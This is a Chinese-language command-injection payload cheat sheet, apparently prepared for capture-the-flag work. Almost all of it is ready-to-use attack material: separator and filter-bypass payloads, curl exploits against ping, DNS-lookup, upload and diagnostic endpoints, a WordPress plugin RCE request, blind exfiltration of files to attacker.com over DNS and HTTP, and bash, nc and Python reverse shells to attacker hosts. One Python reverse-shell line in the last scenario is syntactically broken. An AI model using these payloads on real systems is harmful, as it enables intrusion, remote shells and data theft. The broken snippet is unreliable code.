# 命令注入 - 攻击库
**Keywords**: Command Injection, OS Command Injection, RCE, Remote Code Execution, Shell Injection, Ping Command, System Command

## 基础命令注入Payload

### 命令分隔符
```bash
; command          # Linux/Unix
| command          # 管道
|| command         # 或 (前一个失败才执行)
& command          # 后台执行
&& command         # 与 (前一个成功才执行)
` command `        # 反引号执行
$( command )       # $()执行
```

### 编码绕过
```bash
# Base64编码
echo "id" | base64  # aWQ=
${echo,aWQ=|base64${IFS}d}

# 十六进制
echo -e "\x69\x64"

# Unicode
\u0069\u0064

# 无空格绕过
cat</etc/passwd
cat${IFS}/etc/passwd
cat%09/etc/passwd
```

### 环境变量绕过
```bash
${IFS}          # 空格变量
${PATH}         # 路径变量
${PS4}          # 空格变量
```

## 实际案例提取

### 案例030: WordPress插件RCE
```bash
# CVE-2023-6553
curl -X POST 'http://target/wp-content/plugins/backup-backup/includes/backup-heart.php' \
  --data-urlencode 'cmd=cat /opt/flag.txt'

# 或
curl 'http://target/wp-content/plugins/backup-backup/includes/backup-heart.php?f=download&file=/opt/flag.txt'
```

### 案例031: 命令注入 + 路径遍历
```bash
# Struts2 RCE
curl -X POST 'http://target/struts2/action' \
  -d 'param=`cat /flag.txt`'

# 或使用$()
curl -X POST 'http://target/api' \
  -d 'cmd=$(cat /flag.txt)'
```

### 案例035: 直接命令执行
```bash
# ping命令注入
curl "http://target/ping?host=8.8.8.8%3Bcat%20/flag.txt"
# 解码：host=8.8.8.8;cat /flag.txt

# 使用管道
curl "http://target/ping?host=127.0.0.1|cat%20/etc/passwd"

# 使用&& 
curl "http://target/api?cmd=id&&cat%20/flag.txt"
```

### 案例037: DNS RCE
```bash
# nslookup命令注入
curl "http://target/lookup?domain=google.com%60id%60"
# 反引号在URL中是%60

# 或
curl "http://target/lookup?domain=google.com\$(whoami)"
```

### 案例045: 网络诊断RCE
```bash
# traceroute/ping注入
curl "http://target/diagnostics?host=127.0.0.1;id"
curl "http://target/diagnostics?host=127.0.0.1|whoami"
curl "http://target/diagnostics?host=127.0.0.1&cat /flag.txt"
```

### 案例068: Service检查RCE
```bash
# 扫描端口/服务
curl -X POST "http://target/check_service" \
  -d "service=ssh&host=127.0.0.1%20%26%26%20cat%20/flag.txt"

# 解码：service=ssh&host=127.0.0.1 && cat /flag.txt
```

### 案例073: 上传处理RCE
```bash
# 文件处理中的命令注入
curl -F "image=@test.jpg" \
  "http://target/process?convert=|whoami"

# 或在表单参数中注入
curl -X POST "http://target/upload" \
  -d "filename=test.jpg;cat /flag.txt"
```

## 盲命令注入（无回显）

```bash
# 时间延迟检测
curl "http://target/api?cmd=;sleep%205"

# DNS外带数据
curl "http://target/api?cmd=;nslookup%20\$(cat%20/flag.txt|base64).attacker.com"

# HTTP外带数据
curl "http://target/api?cmd=;curl%20http://attacker.com?d=\$(cat%20/flag.txt|base64)"

# 写入文件
curl "http://target/api?cmd=;cat%20/flag.txt%20>%20/var/www/html/output.txt"
```

## 空格和特殊字符绕过

```bash
# 无空格执行
cat</etc/passwd         # 无空格
cat${IFS}/etc/passwd    # 使用${IFS}
cat%09/etc/passwd       # 使用制表符
cat$'\t'/etc/passwd     # 使用$'\t'

# 其他变体
cat|od -An -tx1</etc/passwd
sed -n l</etc/passwd
```

## Reverse Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# URL编码后
http://target/api?cmd=bash%20-i%20%3E%26%20/dev/tcp/attacker.com/4444%200%3E%261

# nc
nc -e /bin/bash attacker.com 4444

# Python
python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
```

## 快速识别

1. **寻找执行命令的操作**
   - ping, traceroute, nslookup, dig
   - imagemagick convert, ffmpeg
   - 自定义网络诊断工具

2. **测试基础注入**
   ```bash
   ; id
   | id
   || id
   & id
   && id
   ` id `
   $(id)
   ```

3. **检查错误信息**
   - 通常会显示命令执行结果

4. **尝试时间延迟**
   ```bash
   ; sleep 5
   | sleep 5
   && sleep 5
   ```

5. **无回显时尝试外带**
   ```bash
   ; curl http://attacker.com?d=$(whoami)
   ; nslookup $(whoami).attacker.com
   ```

## Payload优先级

1. 简单分隔: `;`, `|`, `&&`, `||`
2. 执行符: `` ` ``, `$()`
3. 环境变量: `${IFS}`, `${PATH}`
4. 编码: Base64, Hex, Unicode
5. 外带数据: curl, nslookup, DNS

## 常见目标命令

```
id, whoami, pwd, ls, cat, wget, curl
ifconfig, ip, netstat, ss
ping, traceroute, dig, nslookup
uname, whoami, env
bash, sh, nc, telnet
```


## 场景1: Ping命令注入
```bash
curl "http://target/ping?host=8.8.8.8;cat /flag.txt"
curl "http://target/ping?host=8.8.8.8|whoami"
curl "http://target/ping?host=8.8.8.8\`cat /etc/passwd\`"
```

## 场景2: 文件上传处理RCE
```bash
curl -F "file=@test.jpg" "http://target/upload?convert=;cat /flag.txt"
curl -X POST "http://target/process" -d "filename=test;id"
```

## 场景3: 反向Shell建立
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# Python
python -c "import os,pty,socket;s=socket.socket();s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),i) for i in range(3)];pty.spawn('/bin/bash')"

# NC
nc -e /bin/bash 10.10.10.10 4444
```
